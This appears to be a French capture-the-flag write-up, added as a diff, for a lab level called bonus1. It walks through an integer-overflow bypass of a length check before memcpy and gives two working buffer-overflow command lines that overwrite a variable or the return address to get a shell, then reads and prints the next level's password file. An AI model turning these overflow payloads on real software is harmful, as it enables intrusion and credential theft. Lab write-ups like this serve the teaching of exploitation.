@@ -1,0 +1,69 @@
+BONUS 1
+-------
+
+1.	gdb bonus1
+
+On sait que le programme attend un av[1] et un av[2].
+L'av[1] correspond à la longueur que l'on va passer dans le memcpy() et
+l'av[2] correspond à la chaîne de caractères que l'on va passer au 2ème arg
+de memcpy(),
+On sait qu'un buffer de 40 est présent qui va être placé en premier argument
+du memcpy().
+Le 3ème argument du memcpy() est un size_t * 4.
+Forme du memcpy(buffer[40], av[2], atoi(av[1]) * 4)
+
+Le but de l'exercice est de faire en sorte de passer un size_t supérieur à 40
+pour dépasser la taille du buffer. Mais le programme a une condition au début
+qui fait que si l'av[1] est supérieur à 9 on return 1. Il y a aussi un * 4 donc
+9 * 4 = 36, pas assez pour overflow le buffer.
+
+Ce que l'on va faire c'est qu'on va mettre un nombre négatif, d'abord nous devons
+trouver lequel. On sait que lorsque l'on multiplie INT_MIN * 4, le résultat devient
+positif. C'est parfait pour nous, INT_MIN passe la première condition.
+Malheureusement -2147483648 * 4 = 4. Après quelques recherches et en lancant mon
+programme dans ressources avec ./a.out -2147483600, on remarque que le résultat
+est supérieur à 4.
+
+Exemple:
+
+i  = -2147483630, i * 4 = 72
+i  = -2147483631, i * 4 = 68
+i  = -2147483632, i * 4 = 64
+i  = -2147483633, i * 4 = 60
+i  = -2147483634, i * 4 = 56
+i  = -2147483635, i * 4 = 52
+i  = -2147483636, i * 4 = 48
+i  = -2147483637, i * 4 = 44
+i  = -2147483638, i * 4 = 40
+i  = -2147483639, i * 4 = 36
+i  = -2147483640, i * 4 = 32
+i  = -2147483641, i * 4 = 28
+i  = -2147483642, i * 4 = 24
+i  = -2147483643, i * 4 = 20
+i  = -2147483644, i * 4 = 16
+i  = -2147483645, i * 4 = 12
+i  = -2147483646, i * 4 = 8
+i  = -2147483647, i * 4 = 4
+
+Donc là 2 possibilités s'offrent à nous:
+
+-On peut prendre -2147483637 pour réecrire la valeur passée en av[1].
+Si on réecrit et on inscrit 0x574f4c46 (qui donne FLOW)
+à la fin du payload, on passe la condition et on lance un shell.
+
+./bonus1 -2147483637 $(python -c 'print "A"*40+"FLOW"')
+
+-On peut prendre -2147483630 pour changer l'EIP et mettre comme EIP
+l'adresse après le if(x == 0x574f4c46). Offset = 56.
+
+./bonus1 -2147483630 $(python -c 'print "A"*56+"\x82\x84\x04\x08"')
+
+\x82\x84\x04\x08 = 0x08048482 = main <+94>
+
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+2.	su bonus2
+	579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
